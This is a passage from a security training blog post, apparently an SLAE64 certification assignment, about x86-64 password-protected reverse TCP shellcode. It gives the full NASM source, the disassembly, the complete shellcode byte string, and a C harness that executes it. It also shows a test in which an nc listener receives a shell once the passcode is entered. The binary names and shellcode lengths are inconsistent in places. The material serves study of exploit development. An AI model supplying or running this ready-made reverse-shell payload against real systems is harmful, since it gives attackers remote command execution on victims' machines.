+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">16</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; duplicate sockets
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; dup2 (new, old)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">al</span>, <span style="color:#ae81ff">33</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; ############ asking for password ------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        password:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; sys_write
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rax : 1 - write syscall number
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rdi : unsigned int fd : 1 for stdout
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rsi : const char *buf : password buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rdx : size_t count : password size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span> <span style="color:#75715e">; or cqo??
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">lea</span> <span style="color:#66d9ef">rsi</span>, [<span style="color:#66d9ef">rel</span> <span style="color:#66d9ef">ask_pass</span>]
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">dl</span>, <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; sys_read
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rdi : unsigned int fd : 0 for stdin
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rsi : char *buf : stack?
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">; rdx : size_t count : how big
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rdx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; rax is already zero
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#ae81ff">32</span> <span style="color:#75715e">;password size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x0a646f6f676f6e6f</span> <span style="color:#75715e">; \ndoogono  --&gt; \n - new line byte = 0x0a
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x7470756d61697461</span> <span style="color:#75715e">; tpumaita
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x6874726165777379</span> <span style="color:#75715e">; htraewsy
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#ae81ff">0x6c6e6d656c6f7369</span> <span style="color:#75715e">; lnmelosi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>                <span style="color:#75715e">; password buffer pointer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#66d9ef">rcx</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rcx</span>, <span style="color:#ae81ff">32</span>                 <span style="color:#75715e">; 31 bytes for password and 1 byte for newline char
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">rep</span><span style="color:#a6e22e">e</span> <span style="color:#66d9ef">cmpsb</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jne</span> <span style="color:#66d9ef">password</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; ###### ------------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; execve
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; First NULL push
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; push /bin//sh in reverse
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#ae81ff">0x68732f2f6e69622f</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rbx</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; store /bin//sh address in RDI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; Second NULL push
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; set RDX
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rdx</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; Push address of /bin//sh
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; set RSI
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">; Call the Execve syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">59</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">syscall</span>
+</span></span></code></pre></div><p>We can verify the shellcode does not have null bytes as shown below with <code>objdump</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>objdump -M intel -d shell-bind-password
+</span></span></code></pre></div><pre tabindex="0"><code>
+shell-bind-password:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000401000 &lt;_start&gt;:
+  401000:	eb 15                	jmp    401017 &lt;main&gt;
+
+0000000000401002 &lt;ask_pass&gt;:
+  401002:	54                   	push   rsp
+  401003:	65 6c                	gs ins BYTE PTR es:[rdi],dx
+  401005:	6c                   	ins    BYTE PTR es:[rdi],dx
+  401006:	20 6d 65             	and    BYTE PTR [rbp+0x65],ch
+  401009:	20 74 68 65          	and    BYTE PTR [rax+rbp*2+0x65],dh
+  40100d:	20 70 61             	and    BYTE PTR [rax+0x61],dh
+  401010:	73 73                	jae    401085 &lt;password+0x9&gt;
+  401012:	63 6f 64             	movsxd ebp,DWORD PTR [rdi+0x64]
+  401015:	65                   	gs
+  401016:	0a                   	.byte 0xa
+
+0000000000401017 &lt;main&gt;:
+  401017:	48 31 f6             	xor    rsi,rsi
+  40101a:	48 f7 e6             	mul    rsi
+  40101d:	48 83 c0 29          	add    rax,0x29
+  401021:	6a 02                	push   0x2
+  401023:	5f                   	pop    rdi
+  401024:	48 ff c6             	inc    rsi
+  401027:	0f 05                	syscall 
+  401029:	48 97                	xchg   rdi,rax
+  40102b:	48 31 c0             	xor    rax,rax
+  40102e:	50                   	push   rax
+  40102f:	66 68 23 29          	pushw  0x2923
+  401033:	66 6a 02             	pushw  0x2
+  401036:	48 89 e6             	mov    rsi,rsp
+  401039:	48 83 c2 10          	add    rdx,0x10
+  40103d:	48 83 c0 31          	add    rax,0x31
+  401041:	0f 05                	syscall 
+  401043:	48 31 c0             	xor    rax,rax
+  401046:	48 89 c2             	mov    rdx,rax
+  401049:	48 83 c2 01          	add    rdx,0x1
+  40104d:	48 83 c0 32          	add    rax,0x32
+  401051:	0f 05                	syscall 
+  401053:	48 31 c0             	xor    rax,rax
+  401056:	48 89 c6             	mov    rsi,rax
+  401059:	48 89 c2             	mov    rdx,rax
+  40105c:	48 83 c0 2b          	add    rax,0x2b
+  401060:	0f 05                	syscall 
+  401062:	48 97                	xchg   rdi,rax
+  401064:	4d 31 c9             	xor    r9,r9
+
+0000000000401067 &lt;loopin&gt;:
+  401067:	48 31 c0             	xor    rax,rax
+  40106a:	48 83 c0 21          	add    rax,0x21
+  40106e:	4c 89 ce             	mov    rsi,r9
+  401071:	0f 05                	syscall 
+  401073:	49 ff c1             	inc    r9
+  401076:	49 83 f9 03          	cmp    r9,0x3
+  40107a:	75 eb                	jne    401067 &lt;loopin&gt;
+
+000000000040107c &lt;password&gt;:
+  40107c:	48 31 c0             	xor    rax,rax
+  40107f:	48 31 d2             	xor    rdx,rdx
+  401082:	48 ff c0             	inc    rax
+  401085:	48 89 c7             	mov    rdi,rax
+  401088:	48 8d 35 73 ff ff ff 	lea    rsi,[rip+0xffffffffffffff73]        # 401002 &lt;ask_pass&gt;
+  40108f:	b2 15                	mov    dl,0x15
+  401091:	0f 05                	syscall 
+  401093:	48 31 d2             	xor    rdx,rdx
+  401096:	48 31 c0             	xor    rax,rax
+  401099:	48 31 ff             	xor    rdi,rdi
+  40109c:	48 89 e6             	mov    rsi,rsp
+  40109f:	48 83 c2 20          	add    rdx,0x20
+  4010a3:	0f 05                	syscall 
+  4010a5:	48 89 e7             	mov    rdi,rsp
+  4010a8:	48 31 f6             	xor    rsi,rsi
+  4010ab:	56                   	push   rsi
+  4010ac:	48 be 6f 6e 6f 67 6f 	movabs rsi,0xa646f6f676f6e6f
+  4010b3:	6f 64 0a 
+  4010b6:	56                   	push   rsi
+  4010b7:	48 be 61 74 69 61 6d 	movabs rsi,0x7470756d61697461
+  4010be:	75 70 74 
+  4010c1:	56                   	push   rsi
+  4010c2:	48 be 79 73 77 65 61 	movabs rsi,0x6874726165777379
+  4010c9:	72 74 68 
+  4010cc:	56                   	push   rsi
+  4010cd:	48 be 69 73 6f 6c 65 	movabs rsi,0x6c6e6d656c6f7369
+  4010d4:	6d 6e 6c 
+  4010d7:	56                   	push   rsi
+  4010d8:	48 89 e6             	mov    rsi,rsp
+  4010db:	48 31 c9             	xor    rcx,rcx
+  4010de:	80 c1 20             	add    cl,0x20
+  4010e1:	f3 a6                	repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
+  4010e3:	75 97                	jne    40107c &lt;password&gt;
+  4010e5:	48 31 c0             	xor    rax,rax
+  4010e8:	50                   	push   rax
+  4010e9:	48 bb 2f 62 69 6e 2f 	movabs rbx,0x68732f2f6e69622f
+  4010f0:	2f 73 68 
+  4010f3:	53                   	push   rbx
+  4010f4:	48 89 e7             	mov    rdi,rsp
+  4010f7:	50                   	push   rax
+  4010f8:	48 89 e2             	mov    rdx,rsp
+  4010fb:	57                   	push   rdi
+  4010fc:	48 89 e6             	mov    rsi,rsp
+  4010ff:	48 83 c0 3b          	add    rax,0x3b
+  401103:	0f 05                	syscall 
+</code></pre><p>From the output we can verify the null bytes were gone effectively.</p>
+<h2 id="compiling-and-testing-the-shellcode">Compiling and Testing the Shellcode<a hidden class="anchor" aria-hidden="true" href="#compiling-and-testing-the-shellcode">#</a></h2>
+<p>To be easier to compile my shellcode scripts and get the size and the opcodes I&rsquo;ll use the 64-bit version of <code>assembler.sh</code>.</p>
+<blockquote>
+<p>Available in <a href="https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh">https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh</a></p>
+</blockquote>
+<p>Checking <code>assembler.sh</code> output</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ../../assembler.sh reverse-shell-password.nasm 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Compiling with NASM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Linking
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Extracting opcodes
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Done
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Shellcode size: <span style="color:#ae81ff">238</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;\xeb\x15\x54\x65\x6c\x6c\x20\x6d\x65\x20\x74\x68\x65\x20\x70\x61\x73\x73\x63\x6f\x64\x65\x0a\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc0\x29\x6a\x02\x5f\x48\xff\xc6\x0f\x05\x48\x97\x48\x31\xc0\x50\x66\x68\x23\x29\x66\x6a\x02\x48\x89\xe6\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x2a\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x31\xd2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\x8b\xff\xff\xff\xb2\x15\x0f\x05\x48\x31\xd2\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x48\x83\xc2\x20\x0f\x05\x48\x89\xe7\x48\x31\xf6\x56\x48\xbe\x6f\x6e\x6f\x67\x6f\x6f\x64\x0a\x56\x48\xbe\x61\x74\x69\x61\x6d\x75\x70\x74\x56\x48\xbe\x79\x73\x77\x65\x61\x72\x74\x68\x56\x48\xbe\x69\x73\x6f\x6c\x65\x6d\x6e\x6c\x56\x48\x89\xe6\x48\x31\xc9\x48\x83\xc1\x20\xf3\xa6\x75\x96\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Hack the World!
+</span></span><span style="display:flex;"><span>--------------------
+</span></span></code></pre></div><p>No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> code[] <span style="color:#f92672">=</span> \
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xeb\x15\x54\x65\x6c\x6c\x20\x6d\x65\x20\x74\x68\x65\x20\x70\x61\x73\x73\x63\x6f\x64\x65\x0a\x48\x31\xf6\x48\xf7\xe6\x48\x83\xc0\x29\x6a\x02\x5f\x48\xff\xc6\x0f\x05\x48\x97\x48\x31\xc0\x50\x66\x68\x23\x29\x66\x6a\x02\x48\x89\xe6\x48\x31\xc0\x48\x89\xc2\x48\x83\xc0\x2a\x48\x89\xe6\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x48\x31\xd2\x48\xff\xc0\x48\x89\xc7\x48\x8d\x35\x8b\xff\xff\xff\xb2\x15\x0f\x05\x48\x31\xd2\x48\x31\xc0\x48\x31\xff\x48\x89\xe6\x48\x83\xc2\x20\x0f\x05\x48\x89\xe7\x48\x31\xf6\x56\x48\xbe\x6f\x6e\x6f\x67\x6f\x6f\x64\x0a\x56\x48\xbe\x61\x74\x69\x61\x6d\x75\x70\x74\x56\x48\xbe\x79\x73\x77\x65\x61\x72\x74\x68\x56\x48\xbe\x69\x73\x6f\x6c\x65\x6d\x6e\x6c\x56\x48\x89\xe6\x48\x31\xc9\x80\xc1\x20\xf3\xa6\x75\x97\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05</span><span style="color:#e6db74">&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Shellcode Length: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(code));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> (<span style="color:#f92672">*</span>ret)() <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int</span>(<span style="color:#f92672">*</span>)())code;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">ret</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Compiling with <code>gcc</code> and executing it</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
+</span></span><span style="display:flex;"><span>shellcode.c:7:1: warning: <span style="color:#66d9ef">return</span> type defaults to ‘int’ <span style="color:#f92672">[</span>-Wimplicit-int<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span> main<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span> ^~~~
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ ./shellcode 
+</span></span><span style="display:flex;"><span>Shellcode Length: <span style="color:#ae81ff">237</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>---------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› 
+</span></span><span style="display:flex;"><span>╰─$ nc -lvnp  <span style="color:#ae81ff">9001</span>         
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>127.0.0.1<span style="color:#f92672">]</span> <span style="color:#ae81ff">44000</span>
+</span></span><span style="display:flex;"><span>Tell me the passcode
+</span></span><span style="display:flex;"><span>hgdajhsd
+</span></span><span style="display:flex;"><span>Tell me the passcode
+</span></span><span style="display:flex;"><span>isolemnlyswearthatiamuptonogood
+</span></span><span style="display:flex;"><span>whoami
+</span></span><span style="display:flex;"><span>edu
+</span></span><span style="display:flex;"><span>id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>edu<span style="color:#f92672">)</span> ...
+</span></span></code></pre></div><p>Oh yeah! We get a connection back and the spawn a shell if th epassword is correct!</p>
+<hr>
+<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>
+<p><code>Student ID: PA-31319</code></p>
+<p>All the source code files are available on GitHub at <a href="https://github.com/0xnibbles/slae_x86_64">https://github.com/0xnibbles/slae_x86_64</a></p>
+<hr>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://0xnibbles.github.io/tags/slae64/">slae64</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_1/">
+    <span class="title">Next »</span>
+    <br>
+    <span>SLAE64 Assignment 1 - TCP Bind Shellcode</span>
+  </a>
+</nav>
+
+
+<div class="share-buttons">
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 2 - TCP Reverse Shellcode on twitter"
+        href="https://twitter.com/intent/tweet/?text=SLAE64%20Assignment%202%20-%20TCP%20Reverse%20Shellcode&amp;url=https%3a%2f%2f0xnibbles.github.io%2fposts%2fslae64%2fslae_64_assignment_2%2f&amp;hashtags=slae64">
+        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+            <path
+                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
+        </svg>
+    </a>
+    <a target="_blank" rel="noopener noreferrer" aria-label="share SLAE64 Assignment 2 - TCP Reverse Shellcode on linkedin"
